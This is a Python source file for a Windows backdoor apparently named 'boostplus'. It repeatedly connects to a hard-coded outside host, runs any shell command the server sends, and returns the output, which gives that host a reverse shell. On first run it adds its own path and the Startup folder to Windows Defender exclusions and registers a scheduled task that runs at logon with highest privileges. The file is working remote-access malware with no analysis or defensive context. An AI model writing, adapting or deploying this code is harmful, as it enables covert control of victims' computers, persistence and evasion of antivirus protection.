import socket
import time
import subprocess
import os
import sys
import threading

SERVER_HOST = "master.amirkaj.link"
SERVER_PORT = 8080
RETRY_DELAY = 5
BUFFER_SIZE = 1024

def connect_to_server():
    while True:
        try:
            print(f"Trying to connect to {SERVER_HOST}:{SERVER_PORT}")
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(10)
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print("Connected to the server")
            return client_socket
        except (socket.error, ConnectionRefusedError, socket.timeout) as e:
            print(f"Connection failed ({e}). Retrying in {RETRY_DELAY} seconds...")
            time.sleep(RETRY_DELAY)

def create_task(target_dir):
    try:
        command = f'schtasks /create /tn boostplus /tr {target_dir} /sc onlogon /rl highest'
        subprocess.run(["powershell", "-Command", command], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
        print("Task created successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {e}")

def add_to_defender_exclusion(path):
    try:
        command = f'Add-MpPreference -ExclusionPath "{path}"'
        subprocess.run(["powershell", "-Command", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW, check=True)
        print(f"Added exclusion for: {path}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to add exclusion: {e}")

def is_first_run():
    first_run_marker = os.path.join(os.getenv('APPDATA'), 'boostplus_first_run.txt')
    if not os.path.exists(first_run_marker):
        with open(first_run_marker, 'w') as f:
            f.write('This is the first run of boostplus.')
        return True
    return False

def handle_server_commands(client_socket):
    try:
        while True:
            try:
                command = client_socket.recv(BUFFER_SIZE).decode()
                if not command:
                    print("Disconnected from server")
                    break
                print(f"Command received: {command}")
                try:
                    result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT, creationflags=subprocess.CREATE_NO_WINDOW)
                except subprocess.CalledProcessError as e:
                    result = f"Error: {e.output}"
                client_socket.send(result.encode())
            except socket.timeout:
                print("Socket timeout. Reconnecting...")
                break
    except (socket.error, ConnectionResetError) as e:
        print(f"Connection lost ({e}). Reconnecting...")
    finally:
        client_socket.close()

def main():
    if is_first_run():
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        add_to_defender_exclusion(os.path.abspath(sys.argv[0]))
        add_to_defender_exclusion(startup_dir)
        create_task(os.path.abspath(sys.argv[0]))

    while True:
        client_socket = connect_to_server()
        command_thread = threading.Thread(target=handle_server_commands, args=(client_socket,))
        command_thread.start()
        command_thread.join()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(e)
        input()